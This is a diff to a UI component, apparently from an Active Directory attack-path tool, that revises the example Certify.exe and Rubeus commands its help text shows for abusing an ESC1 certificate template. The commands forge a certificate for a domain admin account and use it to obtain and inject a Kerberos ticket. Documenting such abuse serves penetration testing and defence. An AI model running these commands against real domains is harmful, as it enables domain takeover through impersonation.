@@ -592,7 +592,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <CodeController>
                 {
-                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestroot\\ForestRootDA'
+                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestrootda /sidextension:S-1-5-21-2697957641-2271029196-387917394-500'
                 }
             </CodeController>
             <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
@@ -623,7 +623,7 @@ const WindowsAbuse: FC = () => {
                 target identity to impersonate and the PFX-formatted certificate created in Step 7:
             </Typography>
             <CodeController>
-                {'Rubeus asktgt /user:"forestroot\\forestrootda" /certificate:cert.pfx /password:asdf /ptt'}
+                {'Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
             </CodeController>
         </>
     );
